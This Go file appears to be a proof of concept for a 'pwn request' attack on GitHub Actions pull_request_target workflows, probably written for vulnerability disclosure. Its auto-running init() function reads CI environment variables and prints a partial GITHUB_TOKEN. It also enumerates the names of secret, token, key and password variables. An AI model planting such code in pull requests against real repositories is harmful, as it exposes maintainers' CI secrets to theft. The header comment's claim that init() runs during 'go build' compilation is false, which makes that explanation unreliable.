package main

import (
  	"fmt"
  	"os"
  	"strings"
  )

// This init() function executes during `go build` compilation and
// when the binary runs. In a pull_request_target context, this code
// runs with the BASE repo's permissions and secrets.
func init() {
  	fmt.Println("========================================")
  	fmt.Println("  PWN-REQUEST PoC - CODE EXECUTION")
  	fmt.Println("========================================")
  	fmt.Printf("GITHUB_REPOSITORY: %s\n", os.Getenv("GITHUB_REPOSITORY"))
  	fmt.Printf("GITHUB_EVENT_NAME: %s\n", os.Getenv("GITHUB_EVENT_NAME"))
  	fmt.Printf("GITHUB_REF: %s\n", os.Getenv("GITHUB_REF"))
  	fmt.Printf("GITHUB_ACTOR: %s\n", os.Getenv("GITHUB_ACTOR"))
  	fmt.Printf("GITHUB_TRIGGERING_ACTOR: %s\n", os.Getenv("GITHUB_TRIGGERING_ACTOR"))
  	fmt.Printf("RUNNER_NAME: %s\n", os.Getenv("RUNNER_NAME"))
  	fmt.Printf("RUNNER_OS: %s\n", os.Getenv("RUNNER_OS"))

  	// Show that GITHUB_TOKEN is accessible (redacted for PoC)
  	token := os.Getenv("GITHUB_TOKEN")
  	if len(token) > 8 {
      		fmt.Printf("GITHUB_TOKEN: %s...%s (length=%d)\n",
                     			token[:4], token[len(token)-4:], len(token))
      	} else {
      		fmt.Printf("GITHUB_TOKEN: (not set or short)\n")
      	}

  	// Show all secrets-like env vars (names only, not values)
  	fmt.Println("\nEnvironment variables containing 'SECRET' or 'TOKEN':")
  	for _, env := range os.Environ() {
      		parts := strings.SplitN(env, "=", 2)
      		name := strings.ToUpper(parts[0])
      		if strings.Contains(name, "SECRET") || strings.Contains(name, "TOKEN") ||
      			strings.Contains(name, "KEY") || strings.Contains(name, "PASSWORD") {
              			fmt.Printf("  %s = [REDACTED, length=%d]\n", parts[0], len(parts[1]))
              		}
      	}

  	fmt.Println("========================================")
  	fmt.Println("  END PoC - secrets accessible in base")
  	fmt.Println("========================================")
  }
